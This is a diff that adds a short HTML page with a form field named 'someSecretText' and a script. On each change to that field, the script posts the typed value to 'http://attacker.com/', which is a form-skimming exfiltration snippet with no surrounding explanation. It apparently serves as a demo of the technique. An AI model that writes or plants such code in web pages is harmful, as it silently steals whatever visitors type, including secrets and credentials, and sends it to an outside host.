@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form method="POST" action="/action.html">
+        <input name="someSecretText" value="">
+        <button type="submit">Send</button>
+    </form>
+    <script>
+        let input = document.querySelector('input[name=someSecretText]')
+        let btn = document.querySelector('button[type=submit]')
+        let someSecretText = ''
+        input.addEventListener('change', e =>{
+            someSecretText = e.target.value
+            var xhr = new XMLHttpRequest()
+            xhr.open('POST', 'http://attacker.com/', false)
+            xhr.send(someSecretText)
+        })
+        // btn.addEventListener('submit', e => {
+            
+        // })
+    </script>
+</body>
+</html>
